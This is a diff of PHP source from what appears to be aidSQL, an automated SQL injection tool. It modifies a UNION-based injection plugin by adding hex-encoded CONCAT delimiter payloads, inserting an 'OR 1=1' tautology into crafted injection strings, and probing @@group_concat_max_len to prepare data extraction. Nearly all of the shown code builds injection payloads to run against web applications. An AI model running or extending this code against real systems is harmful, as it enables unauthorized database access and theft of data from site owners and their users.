@@ -18,11 +18,17 @@
 
 			public function injectionUnionWithConcat(){
 
-				$parser						=	new \aidSQL\parser\Generic();
+				$parser	=	new \aidSQL\parser\Generic();
 
-				$parser->setOpenTag("0x7c,");
-				$parser->setCloseTag(",0x7c");
+				$openTag				=	"{!-";
+				$closeTag			=	"-!}";
 
+				$hexOpen				=	\String::hexEncode($openTag);
+				$hexClose			=	\String::hexEncode($closeTag);
+
+				$parser->setOpenTag($openTag);
+				$parser->setCloseTag($closeTag);
+				$parser->setLog($this->_logger);
 				$this->setParser($parser);
 
 				$offset	=	(isset($this->_config["start-offset"])) ? (int)$this->_config["start-offset"] : 1;
@@ -33,9 +39,9 @@
 
 				}
 
-				$this->detectUnionInjection("unionQuery","CONCAT(0x7c,%value%,0x7c)");
-				
-				if($this->_injection){
+				$this->detectUnionInjection("unionQuery","CONCAT($hexOpen,%value%,$hexClose)");
+
+				if(sizeof($this->_injection)){
 
 					$this->log("FOUND UNION INJECTION WITH CONCAT",0,"light_green");
 					var_dump($this->getGroupConcatLength());
@@ -119,8 +125,8 @@
 			}
 
 			private function unionQuery($value){
-
-				return $this->query($this->craftUnionInjection($value),$this->_injection["requestVariable"],$this->_injection["callback"]);
+				$this->_verbose=1;
+				return $this->query($this->craftUnionInjection($value),$this->_injection["requestVariable"],__FUNCTION__);
 
 			}
 
@@ -139,7 +145,7 @@
 				$queryBuilder->union($params["fieldValues"],"ALL");
 
 				$sql	=	$queryBuilder->getSQL();
-				$sql	=	$params["requestValue"]." ".$params["fieldPayload"].$sql.$params["comment"];
+				$sql	=	$params["requestValue"]." OR 1=1 ".$params["fieldPayload"].$sql.$params["comment"];
 
 				$queryBuilder->setSQL($sql);
 
@@ -178,7 +184,6 @@
 				$this->log("Checking for @@group_concat_max_len",0,"light_cyan");
 
 				$callback	=	$this->_injection["callback"];
-				var_dump($callback);
 				return $this->$callback("@@group_concat_max_len");
 
 			}
